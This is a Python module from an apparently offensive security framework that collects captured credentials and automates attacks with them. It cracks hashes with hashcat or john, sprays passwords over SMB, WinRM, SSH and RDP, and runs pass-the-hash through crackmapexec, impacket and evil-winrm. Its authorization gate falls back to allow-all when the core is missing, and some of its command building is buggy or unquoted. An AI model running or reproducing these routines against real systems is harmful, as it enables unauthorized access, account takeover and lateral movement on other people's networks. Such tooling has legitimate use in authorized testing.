#!/usr/bin/env python3
"""
APOLLO Credential Vault v1 - Centralized credential intelligence with
automatic reuse detection, spray orchestration, and hash cracking queue.

Features:
  - Aggregate all creds from KB into a searchable vault
  - Auto-detect credential reuse across hosts/services
  - Generate spray commands for newly discovered hosts
  - Hash cracking queue (hashcat) with auto-mode detection
  - Password policy analysis (strength, patterns, reuse)
  - Credential validation tracking (which creds work where)
"""
import sys, os, json, subprocess, re, hashlib
from datetime import datetime
from collections import defaultdict
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from kb_manager import (init_db, get_connection, get_active_project,
                        get_project_id, create_event, log_command,
                        add_credential, add_host, get_hosts, get_credentials)

try:
    from apollo_core.safety import preflight as _preflight
    _CORE_AVAILABLE = True
except Exception:  # pragma: no cover - module still runs without core
    _CORE_AVAILABLE = False


def _gate(action, target="", intrusive=True):
    """Safety gate for an active credential operation.

    Returns ``(allowed, dry_run, reason)``. Cracking/spraying/PtH are intrusive
    by default, so with APOLLO_REQUIRE_AUTH set they need an authorized
    engagement, with APOLLO_ENFORCE_SCOPE a target must be in scope, and
    APOLLO_DRY_RUN plans without executing. Degrades to allow-all if the core is
    unavailable, preserving prior behavior.
    """
    if not _CORE_AVAILABLE:
        return True, False, "core-unavailable"
    g = _preflight(action, target=target, intrusive=intrusive)
    return g.allowed, g.dry_run, g.reason

# Hashcat mode mapping for auto-detection
HASHCAT_MODES = [
    (r"^[a-f0-9]{32}$", 0, "MD5"),
    (r"^[a-f0-9]{32}:[a-f0-9]{32}$", 1000, "NTLM"),
    (r"^[a-fA-F0-9]{32}:[a-fA-F0-9]{32}$", 1000, "NTLM"),
    (r"^[a-f0-9]{32}:[^:]+$", 10, "md5($pass.$salt)"),
    (r"^\$krb5tgs\$.+", 13100, "Kerberoast TGS-REP"),
    (r"^\$krb5asrep\$.+", 18200, "AS-REP Roast"),
    (r"^\$NETNTLMv2?\$.+", 5600, "NetNTLMv2"),

    (r"^[a-f0-9]{40}$", 100, "SHA1"),
    (r"^[a-f0-9]{64}$", 1400, "SHA256"),
    (r"^[a-f0-9]{96}$", 17800, "SHA384"),
    (r"^[a-f0-9]{128}$", 1700, "SHA512"),
    (r"^\$2[abxy]\$\d{1,2}\$.{52,53}$", 3200, "bcrypt"),
    (r"^\$6\$.+", 1800, "sha512crypt"),
    (r"^\$5\$.+", 7400, "sha256crypt"),
    (r"^\$1\$.+", 500, "md5crypt"),
    (r"^\$y\$.+", 22200, "yescrypt"),
    (r"^[a-f0-9]{16}$", 1500, "descrypt"),
    (r"^[a-zA-Z0-9./]{13}$", 1500, "descrypt"),
    (r"^\$argon2[id]?\$.+", 32400, "Argon2"),
]

# Common spray wordlists
SPRAY_WORDLISTS = {
    "rockyou": "/usr/share/wordlists/rockyou.txt",
    "common": "/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000.txt",
    "leaked": "/usr/share/seclists/Passwords/Leaked-Databases/rockyou-75.txt",
    "metasploit": "/usr/share/wordlists/metasploit/unix_passwords.txt",
    "usernames": "/usr/share/wordlists/metasploit/unix_users.txt",
}


def vault_summary(project_id):
    """Aggregate credential intelligence from KB."""
    init_db()
    creds = get_credentials(project_id)
    hosts = get_hosts(project_id)

    # Group by username
    by_user = defaultdict(list)
    by_service = defaultdict(list)
    for c in creds:
        by_user[c.get("username", "")].append(c)
        by_service[c.get("service", "")].append(c)

    # Detect reuse: same username:password on multiple hosts
    reuse = []
    cred_key = defaultdict(list)
    for c in creds:
        pwd = c.get("password", "") or c.get("hash", "")
        key = f"{c.get('username','')}:{pwd}"
        cred_key[key].append(c)
    for key, group in cred_key.items():
        ips = set(c.get("ip", "") for c in group)
        if len(ips) > 1:
            reuse.append({"credential": key, "hosts": list(ips),
                          "service": group[0].get("service", "")})

    # Password strength analysis
    weak = []
    for c in creds:
        pwd = c.get("password", "")
        if pwd and pwd != "ENCRYPTED" and len(pwd) < 8:
            weak.append({"username": c.get("username", ""), "password": pwd,
                         "ip": c.get("ip", ""), "reason": "short (<8)"})
        elif pwd and pwd != "ENCRYPTED" and pwd.lower() in ("password", "admin", "root", "123456", "letmein"):
            weak.append({"username": c.get("username", ""), "password": pwd,
                         "ip": c.get("ip", ""), "reason": "common"})

    return {
        "total_creds": len(creds),
        "unique_users": len(by_user),
        "by_service": {k: len(v) for k, v in by_service.items()},
        "reuse_detected": reuse,
        "weak_passwords": weak,
        "hosts_with_creds": len(set(c.get("ip", "") for c in creds if c.get("ip"))),
        "total_hosts": len(hosts),
    }


def detect_hash_type(hash_str):
    """Auto-detect hash type and return hashcat mode."""
    for pattern, mode, name in HASHCAT_MODES:
        if re.match(pattern, hash_str.strip()):
            return {"mode": mode, "name": name, "hash": hash_str}
    return {"mode": None, "name": "unknown", "hash": hash_str}


def generate_crack_commands(hash_str, wordlist="rockyou", rules="best64"):
    """Generate hashcat cracking commands for a hash."""
    info = detect_hash_type(hash_str)
    if info["mode"] is None:
        return {"error": f"Could not detect hash type for: {hash_str[:30]}",
                "suggestion": "Run: hashid <hash> for manual detection"}
    wl = SPRAY_WORDLISTS.get(wordlist, wordlist)
    rule_path = f"/usr/share/hashcat/rules/{rules}.rule"
    return {
        "hash_type": info["name"],
        "mode": info["mode"],
        "commands": [
            f"# Detected: {info['name']} (mode {info['mode']})",
            f"echo '{hash_str}' > /tmp/apollo_hash.txt",
            f"# Dictionary attack with rules:",
            f"hashcat -m {info['mode']} -a 0 /tmp/apollo_hash.txt {wl} -r {rule_path} --force -o /tmp/apollo_cracked.txt --outfile-format 2",
            f"# Brute force (if dictionary fails):",
            f"hashcat -m {info['mode']} -a 3 /tmp/apollo_hash.txt '?a?a?a?a?a?a?a?a' --force -o /tmp/apollo_cracked.txt",
            f"# Show results:",
            f"hashcat -m {info['mode']} /tmp/apollo_hash.txt --show",
        ],
    }


def generate_spray_commands(project_id, target_ip=None, service="smb"):
    """Generate password spray commands using known creds against targets."""
    init_db()
    creds = get_credentials(project_id)
    hosts = get_hosts(project_id)

    # Build unique user:pass pairs
    pairs = set()
    for c in creds:
        u = c.get("username", "")
        p = c.get("password", "")
        if u and p and p != "ENCRYPTED":
            pairs.add((u, p))

    targets = [h["ip"] for h in hosts]
    if target_ip:
        targets = [target_ip]

    commands = []
    for ip in targets:
        if service == "smb":
            for u, p in pairs:
                commands.append(f"crackmapexec smb {ip} -u '{u}' -p '{p}' --continue-on-success")
        elif service == "winrm":
            for u, p in pairs:
                commands.append(f"crackmapexec winrm {ip} -u '{u}' -p '{p}' --continue-on-success")
        elif service == "ssh":
            for u, p in pairs:
                commands.append(f"hydra -l '{u}' -p '{p}' {ip} ssh -t 4")
        elif service == "rdp":
            for u, p in pairs:
                commands.append(f"hydra -l '{u}' -p '{p}' {ip} rdp -t 4")
        elif service == "mssql":
            for u, p in pairs:
                commands.append(f"crackmapexec mssql {ip} -u '{u}' -p '{p}' --continue-on-success")

    return {"service": service, "targets": targets, "cred_pairs": len(pairs),
            "commands": commands}


def auto_spray_new_hosts(project_id, new_host_ips):
    """When new hosts are discovered, auto-generate spray commands using
    existing creds. Returns commands to run."""
    init_db()
    creds = get_credentials(project_id)
    if not creds:
        return {"message": "No credentials in KB to spray with"}

    # Determine likely services on new hosts
    commands = []
    for ip in new_host_ips:
        for service in ["smb", "winrm", "ssh"]:
            cmds = generate_spray_commands(project_id, ip, service)
            commands.extend(cmds["commands"])

    create_event(project_id, "auto_spray", "cred_vault",
                f"Generated {len(commands)} spray commands for {len(new_host_ips)} new hosts",
                {"hosts": new_host_ips, "commands": len(commands)}, "info")
    return {"new_hosts": new_host_ips, "commands": commands}


def cred_reuse_matrix(project_id):
    """Build a matrix of which credentials work on which hosts."""
    init_db()
    creds = get_credentials(project_id)
    hosts = get_hosts(project_id)

    matrix = defaultdict(dict)
    for c in creds:
        user = c.get("username", "")
        ip = c.get("ip", "")
        pwd = c.get("password", "") or c.get("hash", "")
        matrix[user][ip] = {"password": pwd, "service": c.get("service", ""),
                            "source": c.get("source", "")}

    return {"matrix": dict(matrix), "users": list(matrix.keys()),
            "hosts": [h["ip"] for h in hosts]}


def pass_the_hash_commands(project_id, target_ip=None):
    """Generate PtH commands for NTLM hashes in the KB."""
    init_db()
    creds = get_credentials(project_id)
    pth = []
    for c in creds:
        ntlm = c.get("ntlm_hash", "") or ""
        if ntlm and ntlm != "ENCRYPTED":
            user = c.get("username", "")
            targets = [target_ip] if target_ip else [h["ip"] for h in get_hosts(project_id)]
            for ip in targets:
                pth.append({
                    "user": user,
                    "hash": ntlm,
                    "target": ip,
                    "commands": [
                        f"crackmapexec smb {ip} -u '{user}' -H '{ntlm}' --continue-on-success",
                        f"impacket-wmiexec -hashes :{ntlm} {user}@{ip}",
                        f"impacket-psexec -hashes :{ntlm} {user}@{ip}",
                        f"evil-winrm -i {ip} -u {user} -H {ntlm}",
                    ],
                })
    return pth


def crack_queue(project_id):
    """Find all uncracked hashes in KB and generate a cracking queue."""
    init_db()
    creds = get_credentials(project_id)
    queue = []
    for c in creds:
        h = c.get("hash", "")
        if h and h != "ENCRYPTED" and not c.get("password"):
            info = detect_hash_type(h)
            if info["mode"]:
                queue.append({"cred_id": c.get("id"), "username": c.get("username", ""),
                              "ip": c.get("ip", ""), "hash": h,
                              "type": info["name"], "mode": info["mode"],
                              "crack_cmd": f"hashcat -m {info['mode']} -a 0 <hashfile> /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force"})
    return queue


def _run_cmd(cmd, timeout=300):
    """Execute a shell command and return structured result."""
    import subprocess
    try:
        r = subprocess.run(cmd, shell=True, capture_output=True, timeout=timeout, executable="/bin/bash")
        return {"exit_code": r.returncode, "stdout": r.stdout.decode("utf-8", errors="ignore")[:3000],
                "stderr": r.stderr.decode("utf-8", errors="ignore")[:1000]}
    except subprocess.TimeoutExpired:
        return {"exit_code": -1, "stdout": "TIMEOUT", "stderr": ""}
    except Exception as e:
        return {"exit_code": -1, "stdout": str(e), "stderr": ""}

def _tool_check(name):
    return __import__('shutil').which(name) is not None

def execute_crack(hash_str, wordlist="rockyou", rules="best64", timeout=600):
    """Actually crack a hash with hashcat (or john), return found password."""
    import tempfile
    info = detect_hash_type(hash_str)
    if info["mode"] is None:
        return {"error": "Unknown hash type", "hash": hash_str[:40]}
    allowed, dry, reason = _gate("cred_crack", "", intrusive=True)
    if not allowed:
        return {"blocked": True, "reason": reason, "hash": hash_str[:40]}
    if dry:
        return {"dry_run": True, "action": "cred_crack", "hash": hash_str[:40],
                "hash_type": info["name"]}
    wl = SPRAY_WORDLISTS.get(wordlist, wordlist)
    rule_path = f"/usr/share/hashcat/rules/{rules}.rule"
    hash_file = tempfile.mktemp(suffix=".hash")
    out_file = tempfile.mktemp(suffix=".cracked")

    with open(hash_file, "w") as f:
        f.write(hash_str.strip())

    # Prefer hashcat; fallback to john
    if _tool_check("hashcat"):
        cmd = f"hashcat -m {info['mode']} -a 0 {hash_file} {wl} -r {rule_path} --force -o {out_file} --outfile-format 2 --potfile-disable 2>&1"
        result = _run_cmd(cmd, timeout)
        if result["exit_code"] != 0:
            result = _run_cmd(f"hashcat -m {info['mode']} -a 3 {hash_file} '?a?a?a?a?a?a?a?a' --force -o {out_file} --potfile-disable 2>&1", timeout)
    elif _tool_check("john"):
        john_file = hash_file + ".john"
        with open(john_file, "w") as f:
            f.write(f"$dynamic_0${hash_str.strip()}")
        cmd = f"john --wordlist={wl} {john_file} --pot={out_file} 2>&1"
        result = _run_cmd(cmd, timeout)
        result = _run_cmd(f"john --show --pot={out_file} {john_file} 2>&1", 10)
    else:
        return {"error": "No cracking tool available (install hashcat or john)",
                "hash": hash_str[:40]}

    cracked = ""
    if os.path.exists(out_file):
        with open(out_file) as f:
            cracked = f.read().strip()
        os.unlink(out_file)
    for f in (hash_file, john_file):
        if os.path.exists(f): os.unlink(f)

    return {"hash_type": info["name"], "mode": info["mode"], "hash": hash_str[:40],
            "cracked": cracked if cracked else result["stdout"][:200],
            "exit_code": result["exit_code"]}

def _get_spray_binary():
    """Return the available spray binary: netexec (preferred) or crackmapexec."""
    if _tool_check("netexec"): return "netexec"
    if _tool_check("crackmapexec"): return "crackmapexec"
    return None

def execute_spray(project_id, target_ip=None, service="smb", timeout=120):
    """Actually spray credentials using netexec/crackmapexec, return results."""
    import shlex
    spray_bin = _get_spray_binary()
    creds = get_credentials(project_id)
    hosts = get_hosts(project_id)
    pairs = set()
    for c in creds:
        u = c.get("username", "")
        p = c.get("password", "")
        if u and p and p != "ENCRYPTED":
            pairs.add((u, p))
    targets = [h["ip"] for h in hosts]
    if target_ip:
        targets = [target_ip]
    results = []
    if not pairs:
        return {"error": "No valid credential pairs", "results": []}
    for ip in targets:
        allowed, dry, reason = _gate("cred_spray", ip, intrusive=True)
        if not allowed:
            results.append({"ip": ip, "service": service, "success": False,
                            "blocked": True, "reason": reason})
            continue
        if dry:
            results.append({"ip": ip, "service": service, "success": False,
                            "dry_run": True})
            continue
        for u, p in pairs:
            safe_u = shlex.quote(u)
            safe_p = shlex.quote(p)
            if spray_bin:
                if service == "smb":
                    out = _run_cmd(f"{spray_bin} smb {ip} -u {safe_u} -p {safe_p} --continue-on-success 2>&1", timeout)
                elif service == "winrm":
                    out = _run_cmd(f"{spray_bin} winrm {ip} -u {safe_u} -p {safe_p} --continue-on-success 2>&1", timeout)
                elif service == "ssh" and _tool_check("sshpass"):
                    out = _run_cmd(f"sshpass -p {safe_p} ssh -o StrictHostKeyChecking=no {safe_u}@{ip} id 2>&1", timeout)
                elif service == "rdp" and _tool_check("hydra"):
                    out = _run_cmd(f"hydra -l {safe_u} -p {safe_p} rdp://{ip} -t 1 -o /dev/null 2>&1", timeout)
                else:
                    out = _run_cmd(f"{spray_bin} {service} {ip} -u {safe_u} -p {safe_p} --continue-on-success 2>&1", timeout)
            elif _tool_check("hydra"):
                proto = service
                out = _run_cmd(f"hydra -l {safe_u} -p {safe_p} {proto}://{ip} -t 4 -o /dev/null 2>&1", timeout)
            else:
                out = {"stdout": "No spray tool available (install netexec)", "exit_code": -1}
            success = any(m in out["stdout"].lower() for m in ["[+]", "success", "authenticated", "login:"])
            results.append({"ip": ip, "username": u, "service": service, "success": success, "output": out["stdout"][:200]})
    create_event(project_id, "cred_spray", "cred_vault",
                 f"Sprayed {len(pairs)} creds across {len(targets)} targets: {sum(1 for r in results if r['success'])} successes",
                 {"results": results}, "high")
    return {"targets": targets, "cred_pairs": len(pairs), "results": results,
            "success_count": sum(1 for r in results if r["success"])}

def execute_pth(project_id, target_ip=None, timeout=120):
    """Actually execute pass-the-hash attacks using netexec/impacket."""
    import shlex
    spray_bin = _get_spray_binary()
    creds = get_credentials(project_id)
    hosts = get_hosts(project_id)
    results = []
    for c in creds:
        ntlm = c.get("ntlm_hash", "")
        if ntlm and ntlm != "ENCRYPTED":
            user = c.get("username", "")
            targets = [target_ip] if target_ip else [h["ip"] for h in hosts]
            for ip in targets:
                allowed, dry, reason = _gate("cred_pth", ip, intrusive=True)
                if not allowed:
                    results.append({"ip": ip, "username": user, "ntlm_present": True,
                                    "success": False, "blocked": True, "reason": reason})
                    continue
                if dry:
                    results.append({"ip": ip, "username": user, "ntlm_present": True,
                                    "success": False, "dry_run": True})
                    continue
                safe_u = shlex.quote(user)
                if spray_bin:
                    out = _run_cmd(f"{spray_bin} smb {ip} -u {safe_u} -H '{ntlm}' --continue-on-success 2>&1", timeout)
                elif _tool_check("impacket-wmiexec"):
                    out = _run_cmd(f"impacket-wmiexec -hashes :{ntlm} {safe_u}@{ip} 'whoami' 2>&1", timeout)
                else:
                    out = {"stdout": "No PtH tool available (install netexec/impacket)", "exit_code": -1}
                success = "[+]" in out["stdout"] or "has successfully" in out["stdout"].lower()
                results.append({"ip": ip, "username": user, "ntlm_present": True, "success": success, "output": out["stdout"][:200]})
    return {"results": results, "success_count": sum(1 for r in results if r["success"])}


if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("APOLLO Credential Vault v2 (with execution)")
        print("Usage:")
        print(f"  {sys.argv[0]} summary [project]                - Vault summary")
        print(f"  {sys.argv[0]} detect <hash>                    - Detect hash type")
        print(f"  {sys.argv[0]} crack <hash> [wordlist]          - Generate crack commands")
        print(f"  {sys.argv[0]} exec-crack <hash> [wordlist]     - Actually crack hash")
        print(f"  {sys.argv[0]} spray [project] [ip] [service]   - Generate spray commands")
        print(f"  {sys.argv[0]} exec-spray [project] [ip] [svc]  - Actually spray creds")
        print(f"  {sys.argv[0]} matrix [project]                 - Cred reuse matrix")
        print(f"  {sys.argv[0]} pth [project] [ip]               - Generate PtH commands")
        print(f"  {sys.argv[0]} exec-pth [project] [ip]          - Actually execute PtH")
        print(f"  {sys.argv[0]} queue [project]                  - Hash cracking queue")
        sys.exit(0)
    action = sys.argv[1]
    if action == "summary":
        pid = get_project_id(sys.argv[2]) if len(sys.argv) > 2 else get_project_id()
        print(json.dumps(vault_summary(pid), indent=2, default=str))
    elif action == "detect":
        print(json.dumps(detect_hash_type(sys.argv[2]), indent=2))
    elif action == "crack":
        wl = sys.argv[3] if len(sys.argv) > 3 else "rockyou"
        print(json.dumps(generate_crack_commands(sys.argv[2], wl), indent=2))
    elif action == "exec-crack":
        wl = sys.argv[3] if len(sys.argv) > 3 else "rockyou"
        print(json.dumps(execute_crack(sys.argv[2], wl), indent=2, default=str))
    elif action == "spray":
        pid = get_project_id(sys.argv[2]) if len(sys.argv) > 2 and sys.argv[2] != "all" else get_project_id()
        ip = sys.argv[3] if len(sys.argv) > 3 and sys.argv[3].count(".") == 3 else None
        svc = sys.argv[4] if len(sys.argv) > 4 else "smb"
        print(json.dumps(generate_spray_commands(pid, ip, svc), indent=2, default=str))
    elif action == "exec-spray":
        pid = get_project_id(sys.argv[2]) if len(sys.argv) > 2 else get_project_id()
        ip = sys.argv[3] if len(sys.argv) > 3 and sys.argv[3].count(".") == 3 else None
        svc = sys.argv[4] if len(sys.argv) > 4 else "smb"
        print(json.dumps(execute_spray(pid, ip, svc), indent=2, default=str))
    elif action == "matrix":
        pid = get_project_id(sys.argv[2]) if len(sys.argv) > 2 else get_project_id()
        print(json.dumps(cred_reuse_matrix(pid), indent=2, default=str))
    elif action == "pth":
        pid = get_project_id(sys.argv[2]) if len(sys.argv) > 2 and not sys.argv[2].count(".") == 3 else get_project_id()
        ip = None
        for a in sys.argv[2:]:
            if a.count(".") == 3:
                ip = a
        print(json.dumps(pass_the_hash_commands(pid, ip), indent=2, default=str))
    elif action == "exec-pth":
        pid = get_project_id(sys.argv[2]) if len(sys.argv) > 2 and not sys.argv[2].count(".") == 3 else get_project_id()
        ip = None
        for a in sys.argv[2:]:
            if a.count(".") == 3:
                ip = a
        print(json.dumps(execute_pth(pid, ip), indent=2, default=str))
    elif action == "queue":
        pid = get_project_id(sys.argv[2]) if len(sys.argv) > 2 else get_project_id()
        print(json.dumps(crack_queue(pid), indent=2, default=str))
    else:
        print(f"Unknown action: {action}")
